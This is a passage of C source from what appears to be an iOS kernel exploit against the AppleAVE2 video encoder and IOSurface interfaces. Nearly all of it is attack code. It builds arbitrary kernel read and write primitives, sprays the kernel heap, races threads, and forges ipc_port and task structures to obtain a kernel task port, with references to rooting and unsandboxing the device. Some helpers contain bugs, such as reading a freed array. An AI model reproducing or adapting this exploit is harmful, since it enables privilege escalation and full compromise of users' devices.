    *(uint64_t*)(inputmap_InitInfo + 5936) = precalc_value1;
    
    while(!*alert2){if(!_temp_kernel_reading_semaphore) return;}
    //backup_iosurfacebuf = *alert2;
    *alert2 = precalc_value2;
    *(uint64_t*)(inputmap_InitInfo + 5936) = 0;
    
    while(!*alert3){if(!_temp_kernel_reading_semaphore) return;}
    uint64_t verify_v = *alert3;
    (printf)("verify_v: 0x%llx\n", verify_v);
}

uint32_t temp_kernel_reading_release_mem(uint64_t target_addr){
    
    uint32_t retdata = 0;
    do{
        *(uint64_t*)(inputmap_InitInfo + 56) = 0;
        *(uint64_t*)(inputmap_InitInfo + 1096) = 0;
        *(uint64_t*)(inputmap_InitInfo + 5936) = 0;
        
        *(uint64_t*)(inputmap_InitInfo + _temp_kernel_reading_mapOffset) = 0; // input_shit
        
        _temp_kernel_reading_target_addr = target_addr;
        _temp_kernel_reading_semaphore = 0;
        pthread_t ph = NULL;
        pthread_create(&ph, NULL, (void*)_temp_kernel_reading_release_mem_threadFunc, NULL);
        while(!_temp_kernel_reading_semaphore){};
        
        *(uint32_t*)(inputmap_InitInfo + 0x10) = 0x4569; // InfoType
        *(uint32_t*)(inputmap_InitInfo + 12) = 0; // To cause AVE ERROR: multiPassEndPassCounterWFR *Can use for early return
        // or cause unmap later in IMG_V_EncodeAndSendFrame
        
        *(uint32_t*)(inputmap_InitInfo + 96) = 1; // Skip code at: if ( *(_DWORD *)&clientbuf->inputmap_InitInfo_block1[96] != 1 )
        *(uint8_t*)(inputmap_InitInfo + 13477) = 0; // disable kernel_debug
        *(uint64_t*)(inputmap_InitInfo + 5936) = magic_addr + 0x30000 - 0x28; // point to a unused addr
        {
            char input_stru[0x28] = {0};
            *(uint32_t*)(input_stru + 8) = 0;
            *(uint32_t*)(input_stru + 12) = InitInfo_surfaceId;
            
            size_t output_stru_size = 0x4;
            uint32_t output_stru = 0;
            IOConnectCallStructMethod(AppleAVE2UserClient_ioconn, 6, input_stru, 0x28, &output_stru, &output_stru_size);
        }
        _temp_kernel_reading_semaphore = 0;
        pthread_join(ph, NULL);
        
        
        uint32_t *check_if_mem_been_released = (uint32_t*)(inputmap_InitInfo + _temp_kernel_reading_mapOffset + 24);
        if(*check_if_mem_been_released == 0){
            break;
        }
        
    }while(1);
    
    return retdata;
}

void prep_new_reading_primi(){
    // Have to call this everytime in prior to read
    
    char *forge_clientbuf = inputmap_InitInfo + 0x24000;
    uint64_t forge_clientbuf_kaddr = magic_addr + 0x24000;
    
    char *forge_KernelFrameQueue = forge_clientbuf + 0x29B98;
    uint64_t forge_KernelFrameQueue_kaddr = forge_clientbuf_kaddr + 0x29B98;
    
    char *forge_inputmap_FrameInfo = forge_KernelFrameQueue + 24;
    uint64_t forge_inputmap_FrameInfo_kaddr = forge_KernelFrameQueue_kaddr + 24;
    
    *(uint64_t*)(forge_KernelFrameQueue + 0x10) = forge_inputmap_FrameInfo_kaddr;
    
    *(uint32_t*)(forge_clientbuf + 0x8) = 0x0;
    *(forge_clientbuf + 0x27B59) = 0x0;
    
 
    *(uint64_t*)(forge_inputmap_FrameInfo + 16) = 0x4569;
    *(uint32_t*)(forge_clientbuf + 0x4FF0 + 112) = 0x1;
    
    *(uint64_t*)(forge_clientbuf + 0x27838) = forge_inputmap_FrameInfo_kaddr + 0x2A000;
    
    *(uint64_t*)(forge_inputmap_FrameInfo + 5936) = 0;
}

uint32_t new_reading_primitive(uint64_t target_addr){
    
    prep_new_reading_primi();
    
    char *forge_inputmap_FrameInfo = inputmap_InitInfo + 0x24000 + 0x29B98 + 24;
    uint64_t forge_inputmap_FrameInfo_kaddr = magic_addr + 0x24000 + 0x29B98 + 24;
    
    *(uint32_t*)(forge_inputmap_FrameInfo + 20) = 0x2;
    
    uint32_t *retdata = (uint32_t*)(forge_inputmap_FrameInfo + 176);
    *retdata = 0;
    
    char *m_DPB = forge_inputmap_FrameInfo + 0x2A000;
    uint64_t m_DPB_inKernel = forge_inputmap_FrameInfo_kaddr + 0x2A000;
    
    *(uint32_t*)(m_DPB + 20) = 1;
    *(uint32_t*)(m_DPB + 2364) = 0;
    
    char *v8 = m_DPB + 96*(0) + 728;
    uint64_t v8_inKernel = m_DPB_inKernel + 96*(0) + 728;
    
    *(uint64_t*)(v8 + 72) = v8_inKernel + 40;
    *(uint64_t*)(v8 + 80) = 0;
    *(uint64_t*)(v8 + 40) = v8_inKernel + 48 - 32;
    *(uint64_t*)(v8 + 48) = target_addr - 12;
    
    *(uint64_t*)(v8) = 0;
    
    *(uint32_t*)(forge_inputmap_FrameInfo + 0x10) = 0x4569;
    *(uint32_t*)(forge_inputmap_FrameInfo + 12) = 0;
    
    *(uint32_t*)(forge_inputmap_FrameInfo + 96) = 2;
    *(uint8_t*)(forge_inputmap_FrameInfo + 13477) = 0;
    *(uint64_t*)(forge_inputmap_FrameInfo + 5936) = 0;
    {
        char input_stru[0x28] = {0};
        *(uint32_t*)(input_stru + 8) = 0;
        *(uint32_t*)(input_stru + 12) = InitInfo_surfaceId;
        
        size_t output_stru_size = 0x4;
        uint32_t output_stru = 0;
        IOConnectCallStructMethod(AppleAVE2UserClient_ioconn, 6, input_stru, 0x28, &output_stru, &output_stru_size);
    }
    
    return *retdata;
}

void new_writing_primi(uint64_t target_addr, uint32_t write_data){
    
    char *forge_clientbuf = inputmap_InitInfo + 0x24000; // 放在 magic mem + 0x24000的位置
    
    char *forge_KernelFrameQueue = forge_clientbuf + 0x29B98;
    
    //KernelFrameQueue->m_BaseAddress; // in this write prim, m_BaseAddress is the target addr we want it to be overwritten
    *(uint64_t*)(forge_KernelFrameQueue + 0x10) = target_addr - 5948;
    
    // clientbuf->UniqueClientID // in this write prim, UniqueClientID is the data we will use it to overwrite
    *(uint32_t*)(forge_clientbuf + 0x8) = write_data;
    
    {
        char *input_stru = calloc(1, 0x28);
        *(uint32_t*)(input_stru + 8) = 0; // offset of inputmap_FrameInfo, godamn, cool feature
        *(uint32_t*)(input_stru + 12) = InitInfo_surfaceId;
        
        size_t output_stru_size = 0x4;
        char *output_stru = calloc(1, output_stru_size);
        IOConnectCallStructMethod(AppleAVE2UserClient_ioconn, 6, input_stru, 0x28, output_stru, &output_stru_size);
    }
}

void build_fake_task_stru_forReadMem(char *faketask, uint64_t target_addr){
    
    *(uint32_t*)(faketask + 0x10) = 99; // ref_cnt
    
    // offset 0x368: mach task->bsd_info
    
    *(uint64_t*)(faketask + 0x368) = target_addr - 0x60;
}

void build_fake_ipc_port_stru(struct ipc_port *fakeport, uint64_t specify_kobject){
    
    struct ipc_port *_tmp = malloc(sizeof(struct ipc_port));
    bzero(_tmp, sizeof(struct ipc_port));
    
    _tmp->ip_bits = IO_BITS_ACTIVE | IKOT_TASK | IO_BITS_KOBJECT;
    _tmp->ip_references = 100;
    _tmp->ip_lock.type = 0x11;
    _tmp->ip_messages.port.receiver_name = 1;
    _tmp->ip_messages.port.msgcount = 0;
    _tmp->ip_messages.port.qlimit = MACH_PORT_QLIMIT_KERNEL;
    
    _tmp->ip_kobject = specify_kobject;
    _tmp->ip_receiver = ipc_space_kernel_kAddr;
    
    KernelWrite_anySize(fakeport, _tmp, sizeof(struct ipc_port));
    
}

void build_fake_task_stru_forTFP0(struct task *faketask){
    
    //KernelRead_anySize(p_ucred_obtain_rootAndUnsandbox, old_cred, 0x68);
    struct task *_tmp = malloc(sizeof(struct task));
    bzero(_tmp, sizeof(struct task));
    
    _tmp->ref_count = 99;
    _tmp->lock.data = 0x0;
    _tmp->lock.type = 0x22;
    _tmp->active = 1;
    _tmp->pad2 = 1; // Something intro since iOS13, must not be 0, same offsets on iPhoneX and XS
    _tmp->map = kernel_map_kAddr;
    
    KernelWrite_anySize(faketask, _tmp, sizeof(struct task));
}

size_t TT1_seria_data_totalLen = 0;
uint32_t *TT1_seria_data_head = NULL;
uint64_t *TT1_spraydata = NULL;
uint32_t *TT1_seria_data_tail = NULL;

#define TT1_holes_count 20

void Init_spraydata_for_TT1(uint32_t spray_id){
    // kalloc.48
    size_t spray_entity_size = TT1_holes_count * 112;
    TT1_seria_data_totalLen = spray_entity_size + 20 + 8; // 20/8 is head/tail for seriadata format
    TT1_seria_data_head = calloc(1, TT1_seria_data_totalLen);
    TT1_spraydata = (uint64_t *)(((char*)TT1_seria_data_head) + 20);
    TT1_seria_data_tail = (uint32_t *)(((char*)TT1_seria_data_head) + spray_entity_size + 20);
    
    memset(TT1_spraydata, 0x77, spray_entity_size);
    
    TT1_seria_data_head[0] = spray_id;
    TT1_seria_data_head[1] = 0;
    TT1_seria_data_head[2] = kOSSerializeMagic;
    TT1_seria_data_head[3] = kOSSerializeEndCollection | kOSSerializeArray | 2;
    TT1_seria_data_head[4] = kOSSerializeData | (uint32_t)spray_entity_size;
    
    TT1_seria_data_tail[0] = kOSSerializeEndCollection | kOSSerializeString | 2;
    TT1_seria_data_tail[1] = 0x1;
}

uint32_t TT1_sprayid = 0xB201;
void TT1_send_spray(){
    
    size_t output_stru_size = 4;
    uint32_t output_stru = 0;
    
    TT1_sprayid = TT1_sprayid + 1;
    
    // Start spraying
    for(int i=TT1_sprayid; i<(TT1_sprayid+1); i++){
        TT1_seria_data_tail[1] = i;
        if(!check_num_stringlizability_4bytes(i)) // Make sure key is valid
            continue;
        
        // IOSurfaceRootUserClient_sSetValue
        IOConnectCallStructMethod(IOSurfaceRootUserClient_ioconn, 9, TT1_seria_data_head, TT1_seria_data_totalLen, &output_stru, &output_stru_size);
    }
}

size_t TT2_seria_data_totalLen = 0;
uint32_t *TT2_seria_data_head = NULL;
char *TT2_spraydata = NULL;
uint32_t *TT2_seria_data_tail = NULL;

void Init_spraydata_for_TT2(uint32_t spray_id){
    // kalloc.48
    size_t spray_entity_size = 112;
    TT2_seria_data_totalLen = spray_entity_size + 20 + 8; // 20/8 is head/tail for seriadata format
    TT2_seria_data_head = calloc(1, TT2_seria_data_totalLen);
    TT2_spraydata = (((char*)TT2_seria_data_head) + 20);
    TT2_seria_data_tail = (uint32_t *)(((char*)TT2_seria_data_head) + spray_entity_size + 20);
    
    memset(TT2_spraydata, 0x66, spray_entity_size);
    
    TT2_seria_data_head[0] = spray_id;
    TT2_seria_data_head[1] = 0;
    TT2_seria_data_head[2] = kOSSerializeMagic;
    TT2_seria_data_head[3] = kOSSerializeEndCollection | kOSSerializeArray | 2;
    TT2_seria_data_head[4] = kOSSerializeData | (uint32_t)spray_entity_size;
    
    TT2_seria_data_tail[0] = kOSSerializeEndCollection | kOSSerializeString | 2;
    TT2_seria_data_tail[1] = 0x1;
}

void TT2_send_spray(){
    
    size_t output_stru_size = 4;
    uint32_t output_stru = 0;
    
    // Start spraying
    for(int i=0xD205; i<0xDC00; i++){
        *(uint32_t*)(TT2_spraydata + 0x18) = i;
        TT2_seria_data_tail[1] = i;
        if(!check_num_stringlizability_4bytes(i)) // Make sure key is valid
            continue;
        
        // IOSurfaceRootUserClient_sSetValue
        IOConnectCallStructMethod(IOSurfaceRootUserClient_ioconn, 9, TT2_seria_data_head, TT2_seria_data_totalLen, &output_stru, &output_stru_size);
    }
}

void TT2_send_spray_smallspray(){
    
    size_t output_stru_size = 4;
    uint32_t output_stru = 0;
    
    // Start spraying
    for(int i=0xDC01; i<0xDD00; i++){
        *(uint32_t*)(TT2_spraydata + 0x18) = i;
        TT2_seria_data_tail[1] = i;
        if(!check_num_stringlizability_4bytes(i)) // Make sure key is valid
            continue;
        
        // IOSurfaceRootUserClient_sSetValue
        IOConnectCallStructMethod(IOSurfaceRootUserClient_ioconn, 9, TT2_seria_data_head, TT2_seria_data_totalLen, &output_stru, &output_stru_size);
    }
}

void TT2_release_all(){
    
    for(int i=0xD205; i<0xDD00; i++){
        if(!check_num_stringlizability_4bytes(i)) // Make sure key is valid
            continue;
        
        IOSurfaceRootUserClient_sRemoveValue(InitInfo_surfaceId, i);
    }
}

uint8_t add_new_client(){
    size_t input_stru_size = 0x8;
    uint64_t input_stru = 0;
    size_t output_stru_size = 0x8;
    uint32_t output_stru[2] = {0}; // Contain clientbuf->UniqueClientID
    int kr = IOConnectCallStructMethod(AppleAVE2UserClient_ioconn, 0, &input_stru, input_stru_size, output_stru, &output_stru_size);
    // For: AVE ERROR: FindUserClientInfo EnqueueGated failed
    printf("  AVE AddClient kr: 0x%x(%d) clientid:0x%x|0x%x\n", kr, kr, output_stru[0], output_stru[1]);
    if(kr){
        printf("client full\n");
        return 1;
    }
    return 0;
}

void remove_client(){
    size_t input_stru_size = 0x4;
    uint32_t unused1 = 0;
    size_t output_stru_size = 0x4;
    uint32_t unused2 = 0;
    IOConnectCallStructMethod(AppleAVE2UserClient_ioconn, 1, &unused1, input_stru_size, &unused2, &output_stru_size);
    // Neither output_stru or kr has used for indicates any sign of success or failure
}

void encode_client_normal(uint8_t isFor_finalCleaning){
    
    *(uint32_t*)(inputmap_InitInfo + 13344) = 1;
    *(uint32_t*)(inputmap_InitInfo + 13368) = 1;
    *(uint32_t*)(inputmap_InitInfo + 2020) = 160;
    *(uint32_t*)(inputmap_InitInfo + 2024) = 64;
    *(uint32_t*)(inputmap_InitInfo + 2028) = 1;
    
    *(uint32_t*)(inputmap_InitInfo + 0x10) = 0x4569;
    *(uint32_t*)(inputmap_InitInfo + 12) = 5;
    *(uint64_t*)(inputmap_InitInfo + 5936) = 0;
    
    *(uint8_t*)(inputmap_InitInfo + 13288) = 1;
    
    *(uint8_t*)(inputmap_InitInfo + 13377) = 0;
    if(isFor_finalCleaning)
        *(uint32_t*)(inputmap_InitInfo + 4) = 0;
    else
        *(uint32_t*)(inputmap_InitInfo + 4) = 0x333;
    
    *(uint32_t*)(inputmap_InitInfo + 96) = 2;
    
    {
        char *input_stru = calloc(1, 0x110);
        *(uint32_t*)(input_stru + 8) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 12) = InitInfo_surfaceId;
        
        *(uint64_t*)(input_stru + 16) = InitInfo_surfaceId;
        
        *(uint64_t*)(input_stru + 24) = InitInfo_surfaceId;
        
        *(uint64_t*)(input_stru + 28) = InitInfo_surfaceId;
        *(uint64_t*)(input_stru + 32) = InitInfo_surfaceId;
        *(uint64_t*)(input_stru + 36) = InitInfo_surfaceId;
        *(uint64_t*)(input_stru + 40) = InitInfo_surfaceId;
        *(uint64_t*)(input_stru + 44) = InitInfo_surfaceId;
        
        *(uint32_t*)(input_stru + 184) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 188) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 192) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 196) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 200) = InitInfo_surfaceId;
        
        *(uint32_t*)(input_stru + 204) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 208) = InitInfo_surfaceId;
        
        *(uint32_t*)(input_stru + 212) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 216) = InitInfo_surfaceId;
        
        size_t output_stru_size = 0x4;
        char *output_stru = calloc(1, output_stru_size);
        IOConnectCallStructMethod(AppleAVE2UserClient_ioconn, 7, input_stru, 0x110, output_stru, &output_stru_size);
    }
}


void encode_client_normal222(){
    
    *(uint32_t*)(inputmap_InitInfo + 13344) = 1;
    *(uint32_t*)(inputmap_InitInfo + 13368) = 1;
    *(uint32_t*)(inputmap_InitInfo + 2020) = 160;
    *(uint32_t*)(inputmap_InitInfo + 2024) = 64;
    *(uint32_t*)(inputmap_InitInfo + 2028) = 1;
    
    *(uint32_t*)(inputmap_InitInfo + 0x10) = 0x4569;
    *(uint32_t*)(inputmap_InitInfo + 12) = 5;
    *(uint64_t*)(inputmap_InitInfo + 5936) = 0;
    
    *(uint8_t*)(inputmap_InitInfo + 13288) = 1;
    
    *(uint8_t*)(inputmap_InitInfo + 13377) = 0;
    *(uint32_t*)(inputmap_InitInfo + 4) = 0;
    
    *(uint32_t*)(inputmap_InitInfo + 96) = 2;
    
    {
        char *input_stru = calloc(1, 0x110);
        *(uint32_t*)(input_stru + 8) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 12) = InitInfo_surfaceId;
        
        *(uint64_t*)(input_stru + 16) = InitInfo_surfaceId;
        
        *(uint64_t*)(input_stru + 24) = InitInfo_surfaceId;
        
        *(uint64_t*)(input_stru + 28) = InitInfo_surfaceId;
        *(uint64_t*)(input_stru + 32) = InitInfo_surfaceId;
        *(uint64_t*)(input_stru + 36) = InitInfo_surfaceId;
        *(uint64_t*)(input_stru + 40) = InitInfo_surfaceId;
        *(uint64_t*)(input_stru + 44) = InitInfo_surfaceId;
        
        *(uint32_t*)(input_stru + 184) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 188) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 192) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 196) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 200) = InitInfo_surfaceId;
        
        *(uint32_t*)(input_stru + 204) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 208) = InitInfo_surfaceId;
        
        *(uint32_t*)(input_stru + 212) = InitInfo_surfaceId;
        *(uint32_t*)(input_stru + 216) = InitInfo_surfaceId;
        
        size_t output_stru_size = 0x4;
        char *output_stru = calloc(1, output_stru_size);
        
        IOConnectCallStructMethod(AppleAVE2UserClient_ioconn, 7, input_stru, 0x110, output_stru, &output_stru_size);
    }
}

void spray_client(){
    
    *(uint64_t*)(inputmap_InitInfo + 1072) = 0;
    
    pthread_t p3 = NULL;
    pthread_create(&p3, &pth_commAttr, (void*)race_kmem2, NULL);
    
    *(uint32_t*)(inputmap_InitInfo + 13344) = 1;
    *(uint32_t*)(inputmap_InitInfo + 13368) = 1;
    
    *(uint32_t*)(inputmap_InitInfo + 2020) = 0xB0F0-31;
    *(uint32_t*)(inputmap_InitInfo + 2024) = 0x990-31;
    *(uint32_t*)(inputmap_InitInfo + 4) = 1;
    
    *(uint32_t*)(inputmap_InitInfo + 0x10) = 0x4567;
    *(uint32_t*)(inputmap_InitInfo + 12) = 0;
    
    *(uint8_t*)(inputmap_InitInfo + 13288) = 1;
    *(uint32_t*)(inputmap_InitInfo + 96) = 39;
    *(uint32_t*)(inputmap_InitInfo + 1936) = 1;
    
    *(uint32_t*)(inputmap_InitInfo + 13292) = 1;
    *(uint32_t*)(inputmap_InitInfo + 2028) = 1;
    *(uint32_t*)(inputmap_InitInfo + 13388) = 5;
    
    char input_stru[0x110] = {0};
    *(uint32_t*)(input_stru + 8) = InitInfo_surfaceId; // FrameQueue
    *(uint32_t*)(input_stru + 12) = InitInfo_surfaceId; // InitInfo
    
    *(uint64_t*)(input_stru + 16) = InitInfo_surfaceId; // ParameterSetsBuffer
    
    *(uint64_t*)(input_stru + 24) = InitInfo_surfaceId; // mbComplexityMapBuffer
    
    *(uint64_t*)(input_stru + 28) = InitInfo_surfaceId; // statsMapBuffer[0]
    *(uint64_t*)(input_stru + 32) = InitInfo_surfaceId; // statsMapBuffer[1]
    *(uint64_t*)(input_stru + 36) = InitInfo_surfaceId; // statsMapBuffer[2]
    *(uint64_t*)(input_stru + 40) = InitInfo_surfaceId; // statsMapBuffer[3]
    *(uint64_t*)(input_stru + 44) = InitInfo_surfaceId; // statsMapBuffer[4]
    
    *(uint32_t*)(input_stru + 184) = InitInfo_surfaceId; // codedOutputBuffer[0]
    *(uint32_t*)(input_stru + 188) = InitInfo_surfaceId; // codedOutputBuffer[1]
    *(uint32_t*)(input_stru + 192) = InitInfo_surfaceId; // codedOutputBuffer[2]
    *(uint32_t*)(input_stru + 196) = InitInfo_surfaceId; // codedOutputBuffer[3]
    *(uint32_t*)(input_stru + 200) = InitInfo_surfaceId; // codedOutputBuffer[4]
    
    *(uint32_t*)(input_stru + 204) = InitInfo_surfaceId; // xCodeOutputBuffer[0]
    *(uint32_t*)(input_stru + 208) = InitInfo_surfaceId; // xCodeOutputBuffer[1]
    
    *(uint32_t*)(input_stru + 212) = InitInfo_surfaceId; // codedHeaderBuffer [0] *Must Specify
    *(uint32_t*)(input_stru + 216) = InitInfo_surfaceId; // codedHeaderBuffer [1] *Must Specify
    *(uint32_t*)(input_stru + 220) = InitInfo_surfaceId; // codedHeaderBuffer [2]
    *(uint32_t*)(input_stru + 224) = InitInfo_surfaceId; // codedHeaderBuffer [3]
    *(uint32_t*)(input_stru + 228) = InitInfo_surfaceId; // codedHeaderBuffer [4]
    
    *(uint32_t*)(input_stru + 232) = InitInfo_surfaceId; // sliceHeaderBuffer[0]
    *(uint32_t*)(input_stru + 236) = InitInfo_surfaceId; // sliceHeaderBuffer[1]
    *(uint32_t*)(input_stru + 240) = InitInfo_surfaceId; // sliceHeaderBuffer[2]
    *(uint32_t*)(input_stru + 244) = InitInfo_surfaceId; // sliceHeaderBuffer[3]
    *(uint32_t*)(input_stru + 248) = InitInfo_surfaceId; // sliceHeaderBuffer[4]
    
    *(uint32_t*)(input_stru + 48) = InitInfo_surfaceId; // userDPBBuffer[0][0] ioSurface
    *(uint32_t*)(input_stru + 52) = InitInfo_surfaceId; // userDPBBuffer[0][1] ioSurface
    *(uint32_t*)(input_stru + 56) = InitInfo_surfaceId; // userDPBBuffer[1][0] ioSurface
    *(uint32_t*)(input_stru + 60) = InitInfo_surfaceId; // userDPBBuffer[1][1] ioSurface
    *(uint32_t*)(input_stru + 64) = InitInfo_surfaceId; // userDPBBuffer[2][0] ioSurface
    *(uint32_t*)(input_stru + 68) = InitInfo_surfaceId; // userDPBBuffer[2][1] ioSurface
    *(uint32_t*)(input_stru + 72) = InitInfo_surfaceId; // userDPBBuffer[3][0] ioSurface
    *(uint32_t*)(input_stru + 76) = InitInfo_surfaceId; // userDPBBuffer[3][1] ioSurface
    *(uint32_t*)(input_stru + 80) = InitInfo_surfaceId; // userDPBBuffer[4][0] ioSurface
    *(uint32_t*)(input_stru + 84) = InitInfo_surfaceId; // userDPBBuffer[4][1] ioSurface
    *(uint32_t*)(input_stru + 88) = InitInfo_surfaceId; // userDPBBuffer[5][0] ioSurface
    *(uint32_t*)(input_stru + 92) = InitInfo_surfaceId; // userDPBBuffer[5][1] ioSurface
    *(uint32_t*)(input_stru + 96) = InitInfo_surfaceId; // userDPBBuffer[6][0] ioSurface
    *(uint32_t*)(input_stru + 100) = InitInfo_surfaceId; // userDPBBuffer[6][1] ioSurface
    *(uint32_t*)(input_stru + 104) = InitInfo_surfaceId; // userDPBBuffer[7][0] ioSurface
    *(uint32_t*)(input_stru + 108) = InitInfo_surfaceId; // userDPBBuffer[7][1] ioSurface
    *(uint32_t*)(input_stru + 112) = InitInfo_surfaceId; // userDPBBuffer[8][0] ioSurface
    *(uint32_t*)(input_stru + 116) = InitInfo_surfaceId; // userDPBBuffer[8][1] ioSurface
    *(uint32_t*)(input_stru + 120) = InitInfo_surfaceId; // userDPBBuffer[9][0] ioSurface
    *(uint32_t*)(input_stru + 124) = InitInfo_surfaceId; // userDPBBuffer[9][1] ioSurface
    *(uint32_t*)(input_stru + 128) = InitInfo_surfaceId; // userDPBBuffer[10][0] ioSurface
    *(uint32_t*)(input_stru + 132) = InitInfo_surfaceId; // userDPBBuffer[10][1] ioSurface
    *(uint32_t*)(input_stru + 136) = InitInfo_surfaceId; // userDPBBuffer[11][0] ioSurface
    *(uint32_t*)(input_stru + 140) = InitInfo_surfaceId; // userDPBBuffer[11][1] ioSurface
    *(uint32_t*)(input_stru + 144) = InitInfo_surfaceId; // userDPBBuffer[12][0] ioSurface
    *(uint32_t*)(input_stru + 148) = InitInfo_surfaceId; // userDPBBuffer[12][1] ioSurface
    *(uint32_t*)(input_stru + 152) = InitInfo_surfaceId; // userDPBBuffer[13][0] ioSurface
    *(uint32_t*)(input_stru + 156) = InitInfo_surfaceId; // userDPBBuffer[13][1] ioSurface
    *(uint32_t*)(input_stru + 160) = InitInfo_surfaceId; // userDPBBuffer[14][0] ioSurface
    *(uint32_t*)(input_stru + 164) = InitInfo_surfaceId; // userDPBBuffer[14][1] ioSurface
    *(uint32_t*)(input_stru + 168) = InitInfo_surfaceId; // userDPBBuffer[15][0] ioSurface
    *(uint32_t*)(input_stru + 172) = InitInfo_surfaceId; // userDPBBuffer[15][1] ioSurface
    *(uint32_t*)(input_stru + 176) = InitInfo_surfaceId; // userDPBBuffer[16][0] ioSurface
    *(uint32_t*)(input_stru + 180) = InitInfo_surfaceId; // userDPBBuffer[16][1] ioSurface
    
    *(uint8_t*)(input_stru + 256) = 1;
    *(uint64_t*)(input_stru + 264) = 0x2222222222222222;
    
    size_t output_stru_size = 4;
    char output_stru[4] = {0};
    
    IOConnectCallStructMethod(AppleAVE2UserClient_ioconn, 7, input_stru, 0x110, output_stru, &output_stru_size);
}

uint8_t check_if_valid_kernel_ptr(uint64_t target_ptr){
    if(((target_ptr >> 32) & 0xFFFFFFF0) == 0xFFFFFFF0)
        return 1;
    return 0;
}

uint64_t find_proc_byPID(pid_t target_pid) {
    
    uint64_t found_proc = KernelRead_8bytes(HARDCODED_allproc + kaslr);
    while(1){
        // this loop start from the most recent new proc
        if(!found_proc)
            break;
        
        pid_t pid_i = KernelRead_4bytes(found_proc + OFFSET_bsd_info_pid);
        
        if(target_pid == pid_i)
            break;
        
        found_proc = KernelRead_8bytes(found_proc);
    }
    return found_proc;
}

#define PROC_ALL_PIDS        1
extern int proc_listpids(uint32_t type, uint32_t typeinfo, void *buffer, int buffersize);
extern int proc_pidpath(int pid, void * buffer, uint32_t  buffersize);

pid_t look_for_proc(char *proc_name){
    
    pid_t *pids = calloc(1, 3000 * sizeof(pid_t));
    int procs_cnt = proc_listpids(PROC_ALL_PIDS, 0, pids, 3000);
    if(procs_cnt > 3000){
        pids = realloc(pids, procs_cnt * sizeof(pid_t));
        procs_cnt = proc_listpids(PROC_ALL_PIDS, 0, pids, procs_cnt);
    }
    char pathBuffer[4096];
    for (int i=(procs_cnt-1); i>=0; i--) {
        if(pids[i] == 0){continue;}
        
        bzero(pathBuffer, 4096);
        if(proc_pidpath(pids[i], pathBuffer, sizeof(pathBuffer))){
            //printf("  pid(%d): %s\n", pids[i], pathBuffer);
            if(!strcmp(proc_name, pathBuffer)){
                free(pids);
                return pids[i];
            }
        }
    }
    free(pids);
    return 0;
}

pid_t look_for_proc_basename(char *proc_name){
    pid_t *pids = calloc(1, 3000 * sizeof(pid_t));
    int procs_cnt = proc_listpids(PROC_ALL_PIDS, 0, pids, 3000);
    if(procs_cnt > 3000){
        pids = realloc(pids, procs_cnt * sizeof(pid_t));
        procs_cnt = proc_listpids(PROC_ALL_PIDS, 0, pids, procs_cnt);
    }
    char pathBuffer[4096];
    for (int i=(procs_cnt-1); i>=0; i--) {
        if(pids[i] == 0){continue;}
        bzero(pathBuffer, 4096);
        if(proc_pidpath(pids[i], pathBuffer, sizeof(pathBuffer))){
            
            extern char *string_get_basename(const char *str);
            char *ww = string_get_basename(pathBuffer);
            
            if(!strcmp(proc_name, ww)){
                free(pids);
                return pids[i];
            }
        }
    }
    free(pids);
    return 0;
}


#define printf(X,X1...) {char logdata[256];snprintf(logdata, sizeof(logdata), X, X1);extern void log_toView(const char *input_cstr);log_toView(logdata);}
#define printf2(X) {extern void log_toView(const char *input_cstr);log_toView(X);}
//#define printf2 printf

struct paveway_sprayAddrs_pack{
    uint64_t *paveway_sprayAddrs;
    uint32_t paveway_sprayCnt;
};
struct paveway_sprayAddrs_pack *_pack_paveway = 0;
uint32_t _pack_pavewayCnt = 0;

uint64_t hohoo(){
    // LGB at Texas Instrument!
    uint64_t conti_seqno[2] = {0};
    uint64_t *paveway_sprayAddrs = calloc(1, 300 * 8); // 300 is default storage unit count of paveway_sprayAddrs
    uint32_t paveway_sprayCnt = 0;
    while(1){
        uint64_t new_addr = alloc_kernel_40_mem();
        paveway_sprayAddrs[paveway_sprayCnt] = new_addr;
        paveway_sprayCnt ++;
        
        for(int j=0; j<paveway_sprayCnt; j++){
            uint64_t stored_addr = paveway_sprayAddrs[j];
            if((new_addr + 0x30) == stored_addr){
                // If mem right after new_addr is known previously sprayed
                
                if(!conti_seqno[0]){
                    conti_seqno[0] = new_addr;
                } else if(!conti_seqno[1]){
                    if((conti_seqno[0] != stored_addr) && (conti_seqno[0] != (new_addr - 0x30))){
                        // Avoid store an address that is near prev stored conti_seqno[0] address
                        conti_seqno[1] = new_addr;
                    }
                }
            }
            else if((new_addr - 0x30) == stored_addr){
                // If mem right after new_addr is known previously sprayed
                
                if(!conti_seqno[0]){
                    conti_seqno[0] = stored_addr;
                } else if(!conti_seqno[1]){
                    if((conti_seqno[0] != new_addr) && (conti_seqno[0] != (stored_addr - 0x30))){
                        // Avoid store an address that is near prev stored conti_seqno[0] address
                        conti_seqno[1] = stored_addr;
                    }
                }
            }
        }
        
        if(conti_seqno[1]){
            // Collect enough conti memory spray, paveway stage completed.
            break;
        }
        
        if(!(paveway_sprayCnt % 300)){
            // paveway_sprayAddrs is full, expanding the buf size
            paveway_sprayAddrs = realloc(paveway_sprayAddrs, 8 * (paveway_sprayCnt + 300));
        }
    }
    
    for(int i=0; i<paveway_sprayCnt; i++){
        if(paveway_sprayAddrs[i]){
            if((paveway_sprayAddrs[i] == conti_seqno[0]) || (paveway_sprayAddrs[i] == conti_seqno[1])){
                paveway_sprayAddrs[i] = 0;
            }
        }
    }
    
    if(_pack_paveway == NULL){
        _pack_paveway = calloc(1, 10 * sizeof(struct paveway_sprayAddrs_pack)); // 10 is default storage unit count of paveway_sprayAddrs_pack
        _pack_pavewayCnt = 0;
    }
    
    _pack_paveway[_pack_pavewayCnt].paveway_sprayAddrs = paveway_sprayAddrs;
    _pack_paveway[_pack_pavewayCnt].paveway_sprayCnt = paveway_sprayCnt;
    _pack_pavewayCnt ++;
    
    if(!(_pack_pavewayCnt % 10)){
